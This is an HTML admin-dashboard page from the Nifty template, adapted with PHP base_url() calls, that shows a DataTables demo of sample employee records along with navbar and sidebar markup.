
<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:05 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Data Tables | Nifty - Admin Template</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->



    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">


        
    <!--DataTables [ OPTIONAL ]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
	<link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">

    
    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->
        
</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">
        
        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url();?>assets/adminlte/img/logo.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text">Nifty</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->



                        <!--Search-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li>
                            <div class="custom-search-form">
                                <label class="btn btn-trans" for="search-input" data-toggle="collapse" data-target="#nav-searchbox">
                                    <i class="demo-pli-magnifi-glass"></i>
                                </label>
                                <form>
                                    <div class="search-container collapse" id="nav-searchbox">
                                        <input id="search-input" type="text" class="form-control" placeholder="Type for search...">
                                    </div>
                                </form>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Search-->

                    </ul>
                    <ul class="nav navbar-top-links">


                        <!--Mega dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="mega-dropdown">
                            <a href="#" class="mega-dropdown-toggle">
                                <i class="demo-pli-layout-grid"></i>
                            </a>
                            <div class="dropdown-menu mega-dropdown-menu">
                                <div class="row">
                                    <div class="col-sm-4 col-md-3">

                                        <!--Mega menu list-->
                                        <ul class="list-unstyled">
									        <li class="dropdown-header"><i class="demo-pli-file icon-lg icon-fw"></i> Pages</li>
									        <li><a href="#">Profile</a></li>
									        <li><a href="#">Search Result</a></li>
									        <li><a href="#">FAQ</a></li>
									        <li><a href="#">Sreen Lock</a></li>
									        <li><a href="#">Maintenance</a></li>
									        <li><a href="#">Invoice</a></li>
									        <li><a href="#" class="disabled">Disabled</a></li>                                        </ul>

                                    </div>
                                    <div class="col-sm-4 col-md-3">

                                        <!--Mega menu list-->
                                        <ul class="list-unstyled">
									        <li class="dropdown-header"><i class="demo-pli-mail icon-lg icon-fw"></i> Mailbox</li>
									        <li><a href="#"><span class="pull-right label label-danger">Hot</span>Indox</a></li>
									        <li><a href="#">Read Message</a></li>
									        <li><a href="#">Compose</a></li>
									        <li><a href="#">Template</a></li>
                                        </ul>
                                        <p class="pad-top text-main text-sm text-uppercase text-bold"><i class="icon-lg demo-pli-calendar-4 icon-fw"></i>News</p>
                                        <p class="pad-top mar-top bord-top text-sm">Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes.</p>
                                    </div>
                                    <div class="col-sm-4 col-md-3">
                                        <!--Mega menu list-->
                                        <ul class="list-unstyled">
                                            <li>
                                                <a href="#" class="media mar-btm">
                                                    <span class="badge badge-success pull-right">90%</span>
                                                    <div class="media-left">
                                                        <i class="demo-pli-data-settings icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="text-semibold text-main mar-no">Data Backup</p>
                                                        <small class="text-muted">This is the item description</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" class="media mar-btm">
                                                    <div class="media-left">
                                                        <i class="demo-pli-support icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="text-semibold text-main mar-no">Support</p>
                                                        <small class="text-muted">This is the item description</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" class="media mar-btm">
                                                    <div class="media-left">
                                                        <i class="demo-pli-computer-secure icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="text-semibold text-main mar-no">Security</p>
                                                        <small class="text-muted">This is the item description</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" class="media mar-btm">
                                                    <div class="media-left">
                                                        <i class="demo-pli-map-2 icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="text-semibold text-main mar-no">Location</p>
                                                        <small class="text-muted">This is the item description</small>
                                                    </div>
                                                </a>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="col-sm-12 col-md-3">
                                        <p class="dropdown-header"><i class="demo-pli-file-jpg icon-lg icon-fw"></i> Gallery</p>
                                        <div class="row img-gallery">
                                            <div class="col-xs-4">
                                                <img class="img-responsive" src="img/thumbs/img-1.jpg" alt="thumbs">
                                            </div>
                                            <div class="col-xs-4">
                                                <img class="img-responsive" src="img/thumbs/img-3.jpg" alt="thumbs">
                                            </div>
                                            <div class="col-xs-4">
                                                <img class="img-responsive" src="img/thumbs/img-2.jpg" alt="thumbs">
                                            </div>
                                            <div class="col-xs-4">
                                                <img class="img-responsive" src="img/thumbs/img-4.jpg" alt="thumbs">
                                            </div>
                                            <div class="col-xs-4">
                                                <img class="img-responsive" src="img/thumbs/img-6.jpg" alt="thumbs">
                                            </div>
                                            <div class="col-xs-4">
                                                <img class="img-responsive" src="img/thumbs/img-5.jpg" alt="thumbs">
                                            </div>
                                        </div>
                                        <a href="#" class="btn btn-block btn-primary">Browse Gallery</a>
                                    </div>
                                </div>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End mega dropdown-->



                        <!--Notification dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
                                <i class="demo-pli-bell"></i>
                                <span class="badge badge-header badge-danger"></span>
                            </a>


                            <!--Notification dropdown menu-->
                            <div class="dropdown-menu dropdown-menu-md dropdown-menu-right">
                                <div class="nano scrollable">
                                    <div class="nano-content">
                                        <ul class="head-list">
                                            <li>
                                                <a href="#" class="media add-tooltip" data-title="Used space : 95%" data-container="body" data-placement="bottom">
                                                    <div class="media-left">
                                                        <i class="demo-pli-data-settings icon-2x text-main"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="text-nowrap text-main text-semibold">HDD is full</p>
                                                        <div class="progress progress-sm mar-no">
                                                            <div style="width: 95%;" class="progress-bar progress-bar-danger">
                                                                <span class="sr-only">95% Complete</span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <i class="demo-pli-file-edit icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Write a news article</p>
                                                        <small>Last Update 8 hours ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <span class="label label-info pull-right">New</span>
                                                    <div class="media-left">
                                                        <i class="demo-pli-speech-bubble-7 icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Comment Sorting</p>
                                                        <small>Last Update 8 hours ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <i class="demo-pli-add-user-star icon-2x"></i>
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">New User Registered</p>
                                                        <small>4 minutes ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <img class="img-circle img-sm" alt="Profile Picture" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/9.png">
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Lucy sent you a message</p>
                                                        <small>30 minutes ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                            <li>
                                                <a class="media" href="#">
                                                    <div class="media-left">
                                                        <img class="img-circle img-sm" alt="Profile Picture" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/3.png">
                                                    </div>
                                                    <div class="media-body">
                                                        <p class="mar-no text-nowrap text-main text-semibold">Jackson sent you a message</p>
                                                        <small>40 minutes ago</small>
                                                    </div>
                                                </a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>

                                <!--Dropdown footer-->
                                <div class="pad-all bord-top">
                                    <a href="#" class="btn-link text-main box-block">
                                        <i class="pci-chevron chevron-right pull-right"></i>Show All Notifications
                                    </a>
                                </div>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End notifications dropdown-->



                        <!--User dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li id="dropdown-user" class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle text-right">
                                <span class="ic-user pull-right">
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <!--You can use an image instead of an icon.-->
                                    <!--<img class="img-circle img-user media-object" src="img/profile-photos/1.png" alt="Profile Picture">-->
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <i class="demo-pli-male"></i>
                                </span>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--You can also display a user name in the navbar.-->
                                <!--<div class="username hidden-xs">Aaron Chavez</div>-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            </a>


                            <div class="dropdown-menu dropdown-menu-sm dropdown-menu-right panel-default">
                                <ul class="head-list">
                                    <li>
                                        <a href="#"><i class="demo-pli-male icon-lg icon-fw"></i> Profile</a>
                                    </li>
                                    <li>
                                        <a href="#"><span class="badge badge-danger pull-right">9</span><i class="demo-pli-mail icon-lg icon-fw"></i> Messages</a>
                                    </li>
                                    <li>
                                        <a href="#"><span class="label label-success pull-right">New</span><i class="demo-pli-gear icon-lg icon-fw"></i> Settings</a>
                                    </li>
                                    <li>
                                        <a href="#"><i class="demo-pli-computer-secure icon-lg icon-fw"></i> Lock screen</a>
                                    </li>
                                    <li>
                                        <a href="pages-login.html"><i class="demo-pli-unlock icon-lg icon-fw"></i> Logout</a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End user dropdown-->
 
                        
                        <li>
                            <a href="#" class="aside-toggle">
                                <i class="demo-pli-dot-vertical"></i>
                            </a>
                        </li>
                    </ul>
                </div>
                <!--================================-->
                <!--End Navbar Dropdown-->

            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">
                <div id="page-head">
                    
                    <!--Page Title-->
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <div id="page-title">
                        <h1 class="page-header text-overflow">Data Tables</h1>
                    </div>
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <!--End page title-->


                    <!--Breadcrumb-->
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <ol class="breadcrumb">
					<li><a href="#"><i class="demo-pli-home"></i></a></li>
					<li><a href="#">Tables</a></li>
					<li class="active">Data Tables</li>
                    </ol>
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <!--End breadcrumb-->

                </div>

                
                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">
                    
					<!-- Basic Data Tables -->
					<!--===================================================-->
					<div class="panel">
					    <div class="panel-heading">
					        <h3 class="panel-title">Basic Data Tables with responsive plugin</h3>
					    </div>
					    <div class="panel-body">
					        <table id="demo-dt-basic" class="table table-striped table-bordered" cellspacing="0" width="100%">
					            <thead>
					                <tr>
					                    <th>Name</th>
					                    <th>Position</th>
					                    <th class="min-tablet">Office</th>
					                    <th class="min-tablet">Extn.</th>
					                    <th class="min-desktop">Start date</th>
					                    <th class="min-desktop">Salary</th>
					                </tr>
					            </thead>
					            <tbody>
					                <tr>
					                    <td>Tiger Nixon</td>
					                    <td>System Architect</td>
					                    <td>Edinburgh</td>
					                    <td>61</td>
					                    <td>2011/04/25</td>
					                    <td>$320,800</td>
					                </tr>
					                <tr>
					                    <td>Garrett Winters</td>
					                    <td>Accountant</td>
					                    <td>Tokyo</td>
					                    <td>63</td>
					                    <td>2011/07/25</td>
					                    <td>$170,750</td>
					                </tr>
					                <tr>
					                    <td>Ashton Cox</td>
					                    <td>Junior Technical Author</td>
					                    <td>San Francisco</td>
					                    <td>66</td>
					                    <td>2009/01/12</td>
					                    <td>$86,000</td>
					                </tr>
					                <tr>
					                    <td>Cedric Kelly</td>
					                    <td>Senior Javascript Developer</td>
					                    <td>Edinburgh</td>
					                    <td>22</td>
					                    <td>2012/03/29</td>
					                    <td>$433,060</td>
					                </tr>
					                <tr>
					                    <td>Airi Satou</td>
					                    <td>Accountant</td>
					                    <td>Tokyo</td>
					                    <td>33</td>
					                    <td>2008/11/28</td>
					                    <td>$162,700</td>
					                </tr>
					                <tr>
					                    <td>Brielle Williamson</td>
					                    <td>Integration Specialist</td>
					                    <td>New York</td>
					                    <td>61</td>
					                    <td>2012/12/02</td>
					                    <td>$372,000</td>
					                </tr>
					                <tr>
					                    <td>Herrod Chandler</td>
					                    <td>Sales Assistant</td>
					                    <td>San Francisco</td>
					                    <td>59</td>
					                    <td>2012/08/06</td>
					                    <td>$137,500</td>
					                </tr>
					                <tr>
					                    <td>Rhona Davidson</td>
					                    <td>Integration Specialist</td>
					                    <td>Tokyo</td>
					                    <td>55</td>
					                    <td>2010/10/14</td>
					                    <td>$327,900</td>
					                </tr>
					                <tr>
					                    <td>Colleen Hurst</td>
					                    <td>Javascript Developer</td>
					                    <td>San Francisco</td>
					                    <td>39</td>
					                    <td>2009/09/15</td>
					                    <td>$205,500</td>
					                </tr>
					                <tr>
					                    <td>Sonya Frost</td>
					                    <td>Software Engineer</td>
					                    <td>Edinburgh</td>
					                    <td>23</td>
					                    <td>2008/12/13</td>
					                    <td>$103,600</td>
					                </tr>
					                <tr>
					                    <td>Jena Gaines</td>
					                    <td>Office Manager</td>
					                    <td>London</td>
					                    <td>30</td>
					                    <td>2008/12/19</td>
					                    <td>$90,560</td>
					                </tr>
					                <tr>
					                    <td>Quinn Flynn</td>
					                    <td>Support Lead</td>
					                    <td>Edinburgh</td>
					                    <td>22</td>
					                    <td>2013/03/03</td>
					                    <td>$342,000</td>
					                </tr>
					                <tr>
					                    <td>Charde Marshall</td>
					                    <td>Regional Director</td>
					                    <td>San Francisco</td>
					                    <td>36</td>
					                    <td>2008/10/16</td>
					                    <td>$470,600</td>
					                </tr>
					                <tr>
					                    <td>Haley Kennedy</td>
					                    <td>Senior Marketing Designer</td>
					                    <td>London</td>
					                    <td>43</td>
					                    <td>2012/12/18</td>
					                    <td>$313,500</td>
					                </tr>
					                <tr>
					                    <td>Tatyana Fitzpatrick</td>
					                    <td>Regional Director</td>
					                    <td>London</td>
					                    <td>19</td>
					                    <td>2010/03/17</td>
					                    <td>$385,750</td>
					                </tr>
					                <tr>
					                    <td>Michael Silva</td>
					                    <td>Marketing Designer</td>
					                    <td>London</td>
					                    <td>66</td>
					                    <td>2012/11/27</td>
					                    <td>$198,500</td>
					                </tr>
					                <tr>
					                    <td>Paul Byrd</td>
					                    <td>Chief Financial Officer (CFO)</td>
					                    <td>New York</td>
					                    <td>64</td>
					                    <td>2010/06/09</td>
					                    <td>$725,000</td>
					                </tr>
					                <tr>
					                    <td>Gloria Little</td>
					                    <td>Systems Administrator</td>
					                    <td>New York</td>
					                    <td>59</td>
					                    <td>2009/04/10</td>
					                    <td>$237,500</td>
					                </tr>
					                <tr>
					                    <td>Bradley Greer</td>
					                    <td>Software Engineer</td>
					                    <td>London</td>
					                    <td>41</td>
					                    <td>2012/10/13</td>
					                    <td>$132,000</td>
					                </tr>
					                <tr>
					                    <td>Dai Rios</td>
					                    <td>Personnel Lead</td>
					                    <td>Edinburgh</td>
					                    <td>35</td>
					                    <td>2012/09/26</td>
					                    <td>$217,500</td>
					                </tr>
					                <tr>
					                    <td>Jenette Caldwell</td>
					                    <td>Development Lead</td>
					                    <td>New York</td>
					                    <td>30</td>
					                    <td>2011/09/03</td>
					                    <td>$345,000</td>
					                </tr>
					                <tr>
					                    <td>Yuri Berry</td>
					                    <td>Chief Marketing Officer (CMO)</td>
					                    <td>New York</td>
					                    <td>40</td>
					                    <td>2009/06/25</td>
					                    <td>$675,000</td>
					                </tr>
					                <tr>
					                    <td>Caesar Vance</td>
					                    <td>Pre-Sales Support</td>
					                    <td>New York</td>
					                    <td>21</td>
					                    <td>2011/12/12</td>
					                    <td>$106,450</td>
					                </tr>
					                <tr>
					                    <td>Doris Wilder</td>
					                    <td>Sales Assistant</td>
					                    <td>Sidney</td>
					                    <td>23</td>
					                    <td>2010/09/20</td>
					                    <td>$85,600</td>
					                </tr>
					                <tr>
					                    <td>Angelica Ramos</td>
					                    <td>Chief Executive Officer (CEO)</td>
					                    <td>London</td>
					                    <td>47</td>
					                    <td>2009/10/09</td>
					                    <td>$1,200,000</td>
					                </tr>
					                <tr>
					                    <td>Gavin Joyce</td>
					                    <td>Developer</td>
					                    <td>Edinburgh</td>
					                    <td>42</td>
					                    <td>2010/12/22</td>
					                    <td>$92,575</td>
					                </tr>
					                <tr>
					                    <td>Jennifer Chang</td>
					                    <td>Regional Director</td>
					                    <td>Singapore</td>
					                    <td>28</td>
					                    <td>2010/11/14</td>
					                    <td>$357,650</td>
					                </tr>
					                <tr>
					                    <td>Brenden Wagner</td>
					                    <td>Software Engineer</td>
					                    <td>San Francisco</td>
					                    <td>28</td>
					                    <td>2011/06/07</td>
					                    <td>$206,850</td>
					                </tr>
					                <tr>
					                    <td>Fiona Green</td>
					                    <td>Chief Operating Officer (COO)</td>
					                    <td>San Francisco</td>
					                    <td>48</td>
					                    <td>2010/03/11</td>
					                    <td>$850,000</td>
					                </tr>
					                <tr>
					                    <td>Shou Itou</td>
					                    <td>Regional Marketing</td>
					                    <td>Tokyo</td>
					                    <td>20</td>
					                    <td>2011/08/14</td>
					                    <td>$163,000</td>
					                </tr>
					                <tr>
					                    <td>Michelle House</td>
					                    <td>Integration Specialist</td>
					                    <td>Sidney</td>
					                    <td>37</td>
					                    <td>2011/06/02</td>
					                    <td>$95,400</td>
					                </tr>
					                <tr>
					                    <td>Suki Burks</td>
					                    <td>Developer</td>
					                    <td>London</td>
					                    <td>53</td>
					                    <td>2009/10/22</td>
					                    <td>$114,500</td>
					                </tr>
					                <tr>
					                    <td>Prescott Bartlett</td>
					                    <td>Technical Author</td>
					                    <td>London</td>
					                    <td>27</td>
					                    <td>2011/05/07</td>
					                    <td>$145,000</td>
					                </tr>
					                <tr>
					                    <td>Gavin Cortez</td>
					                    <td>Team Leader</td>
					                    <td>San Francisco</td>
					                    <td>22</td>
					                    <td>2008/10/26</td>
					                    <td>$235,500</td>
					                </tr>
					                <tr>
					                    <td>Martena Mccray</td>
					                    <td>Post-Sales support</td>
					                    <td>Edinburgh</td>
					                    <td>46</td>
					                    <td>2011/03/09</td>
					                    <td>$324,050</td>
					                </tr>
					                <tr>
					                    <td>Unity Butler</td>
					                    <td>Marketing Designer</td>
					                    <td>San Francisco</td>
					                    <td>47</td>
					                    <td>2009/12/09</td>
					                    <td>$85,675</td>
					                </tr>
					                <tr>
					                    <td>Howard Hatfield</td>
					                    <td>Office Manager</td>
					                    <td>San Francisco</td>
					                    <td>51</td>
					                    <td>2008/12/16</td>
					                    <td>$164,500</td>
					                </tr>
					                <tr>
					                    <td>Hope Fuentes</td>
					                    <td>Secretary</td>
					                    <td>San Francisco</td>
					                    <td>41</td>
					                    <td>2010/02/12</td>
					                    <td>$109,850</td>
					                </tr>
					                <tr>
					                    <td>Vivian Harrell</td>
					                    <td>Financial Controller</td>
					                    <td>San Francisco</td>
					                    <td>62</td>
					                    <td>2009/02/14</td>
					                    <td>$452,500</td>
					                </tr>
					                <tr>
					                    <td>Timothy Mooney</td>
					                    <td>Office Manager</td>
					                    <td>London</td>
					                    <td>37</td>
					                    <td>2008/12/11</td>
					                    <td>$136,200</td>
					                </tr>
					                <tr>
					                    <td>Jackson Bradshaw</td>
					                    <td>Director</td>
					                    <td>New York</td>
					                    <td>65</td>
					                    <td>2008/09/26</td>
					                    <td>$645,750</td>
					                </tr>
					                <tr>
					                    <td>Olivia Liang</td>
					                    <td>Support Engineer</td>
					                    <td>Singapore</td>
					                    <td>64</td>
					                    <td>2011/02/03</td>
					                    <td>$234,500</td>
					                </tr>
					                <tr>
					                    <td>Bruno Nash</td>
					                    <td>Software Engineer</td>
					                    <td>London</td>
					                    <td>38</td>
					                    <td>2011/05/03</td>
					                    <td>$163,500</td>
					                </tr>
					                <tr>
					                    <td>Sakura Yamamoto</td>
					                    <td>Support Engineer</td>
					                    <td>Tokyo</td>
					                    <td>37</td>
					                    <td>2009/08/19</td>
					                    <td>$139,575</td>
					                </tr>
					                <tr>
					                    <td>Thor Walton</td>
					                    <td>Developer</td>
					                    <td>New York</td>
					                    <td>61</td>
					                    <td>2013/08/11</td>
					                    <td>$98,540</td>
					                </tr>
					                <tr>
					                    <td>Finn Camacho</td>
					                    <td>Support Engineer</td>
					                    <td>San Francisco</td>
					                    <td>47</td>
					                    <td>2009/07/07</td>
					                    <td>$87,500</td>
					                </tr>
					                <tr>
					                    <td>Serge Baldwin</td>
					                    <td>Data Coordinator</td>
					                    <td>Singapore</td>
					                    <td>64</td>
					                    <td>2012/04/09</td>
					                    <td>$138,575</td>
					                </tr>
					                <tr>
					                    <td>Zenaida Frank</td>
					                    <td>Software Engineer</td>
					                    <td>New York</td>
					                    <td>63</td>
					                    <td>2010/01/04</td>
					                    <td>$125,250</td>
					                </tr>
					                <tr>
					                    <td>Zorita Serrano</td>
					                    <td>Software Engineer</td>
					                    <td>San Francisco</td>
					                    <td>56</td>
					                    <td>2012/06/01</td>
					                    <td>$115,000</td>
					                </tr>
					                <tr>
					                    <td>Jennifer Acosta</td>
					                    <td>Junior Javascript Developer</td>
					                    <td>Edinburgh</td>
					                    <td>43</td>
					                    <td>2013/02/01</td>
					                    <td>$75,650</td>
					                </tr>
					                <tr>
					                    <td>Cara Stevens</td>
					                    <td>Sales Assistant</td>
					                    <td>New York</td>
					                    <td>46</td>
					                    <td>2011/12/06</td>
					                    <td>$145,600</td>
					                </tr>
					                <tr>
					                    <td>Hermione Butler</td>
					                    <td>Regional Director</td>
					                    <td>London</td>
					                    <td>47</td>
					                    <td>2011/03/21</td>
					                    <td>$356,250</td>
					                </tr>
					                <tr>
					                    <td>Lael Greer</td>
					                    <td>Systems Administrator</td>
					                    <td>London</td>
					                    <td>21</td>
					                    <td>2009/02/27</td>
					                    <td>$103,500</td>
					                </tr>
					                <tr>
					                    <td>Jonas Alexander</td>
					                    <td>Developer</td>
					                    <td>San Francisco</td>
					                    <td>30</td>
					                    <td>2010/07/14</td>
					                    <td>$86,500</td>
					                </tr>
					                <tr>
					                    <td>Shad Decker</td>
					                    <td>Regional Director</td>
					                    <td>Edinburgh</td>
					                    <td>51</td>
					                    <td>2008/11/13</td>
					                    <td>$183,000</td>
					                </tr>
					                <tr>
					                    <td>Michael Bruce</td>
					                    <td>Javascript Developer</td>
					                    <td>Singapore</td>
					                    <td>29</td>
					                    <td>2011/06/27</td>
					                    <td>$183,000</td>
					                </tr>
					                <tr>
					                    <td>Donna Snider</td>
					                    <td>Customer Support</td>
					                    <td>New York</td>
					                    <td>27</td>
					                    <td>2011/01/25</td>
					                    <td>$112,000sadsads adsadasdasdasdsad sadasdsad</td>
					                </tr>
					            </tbody>
					        </table>
					    </div>
					</div>
					<!--===================================================-->
					<!-- End Striped Table -->
					
					
					
					
                </div>
                <!--===================================================-->
                <!--End page content-->

            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->


            
            <!--ASIDE-->
            <!--===================================================-->
            <aside id="aside-container">
                <div id="aside">
                    <div class="nano">
                        <div class="nano-content">
                            
                            <!--Nav tabs-->
                            <!--================================-->
                            <ul class="nav nav-tabs nav-justified">
                                <li class="active">
                                    <a href="#demo-asd-tab-1" data-toggle="tab">
                                        <i class="demo-pli-speech-bubble-7 icon-lg"></i>
                                    </a>
                                </li>
                                <li>
                                    <a href="#demo-asd-tab-2" data-toggle="tab">
                                        <i class="demo-pli-information icon-lg icon-fw"></i> Report
                                    </a>
                                </li>
                                <li>
                                    <a href="#demo-asd-tab-3" data-toggle="tab">
                                        <i class="demo-pli-wrench icon-lg icon-fw"></i> Settings
                                    </a>
                                </li>
                            </ul>
                            <!--================================-->
                            <!--End nav tabs-->



                            <!-- Tabs Content -->
                            <!--================================-->
                            <div class="tab-content">

                                <!--First tab (Contact list)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade in active" id="demo-asd-tab-1">
                                    <p class="pad-all text-main text-sm text-uppercase text-bold">
                                        <span class="pull-right badge badge-warning">3</span> Family
                                    </p>

                                    <!--Family-->
                                    <div class="list-group bg-trans">
							            <a href="#" class="list-group-item">
							                <div class="media-left pos-rel">
							                    <img class="img-circle img-xs" src="img/profile-photos/2.png" alt="Profile Picture">
												<i class="badge badge-success badge-stat badge-icon pull-left"></i>
							                </div>
							                <div class="media-body">
							                    <p class="mar-no text-main">Stephen Tran</p>
							                    <small class="text-muteds">Availabe</small>
							                </div>
							            </a>
							            <a href="#" class="list-group-item">
							                <div class="media-left pos-rel">
							                    <img class="img-circle img-xs" src="img/profile-photos/7.png" alt="Profile Picture">
							                </div>
							                <div class="media-body">
							                    <p class="mar-no text-main">Brittany Meyer</p>
							                    <small class="text-muteds">I think so</small>
							                </div>
							            </a>
							            <a href="#" class="list-group-item">
							                <div class="media-left pos-rel">
							                    <img class="img-circle img-xs" src="img/profile-photos/1.png" alt="Profile Picture">
												<i class="badge badge-info badge-stat badge-icon pull-left"></i>
							                </div>
							                <div class="media-body">
							                    <p class="mar-no text-main">Jack George</p>
							                    <small class="text-muteds">Last Seen 2 hours ago</small>
							                </div>
							            </a>
							            <a href="#" class="list-group-item">
							                <div class="media-left pos-rel">
							                    <img class="img-circle img-xs" src="img/profile-photos/4.png" alt="Profile Picture">
							                </div>
							                <div class="media-body">
							                    <p class="mar-no text-main">Donald Brown</p>
							                    <small class="text-muteds">Lorem ipsum dolor sit amet.</small>
							                </div>
							            </a>
							            <a href="#" class="list-group-item">
							                <div class="media-left pos-rel">
							                    <img class="img-circle img-xs" src="img/profile-photos/8.png" alt="Profile Picture">
												<i class="badge badge-warning badge-stat badge-icon pull-left"></i>
							                </div>
							                <div class="media-body">
							                    <p class="mar-no text-main">Betty Murphy</p>
							                    <small class="text-muteds">Idle</small>
							                </div>
							            </a>
							            <a href="#" class="list-group-item">
							                <div class="media-left pos-rel">
							                    <img class="img-circle img-xs" src="img/profile-photos/9.png" alt="Profile Picture">
												<i class="badge badge-danger badge-stat badge-icon pull-left"></i>
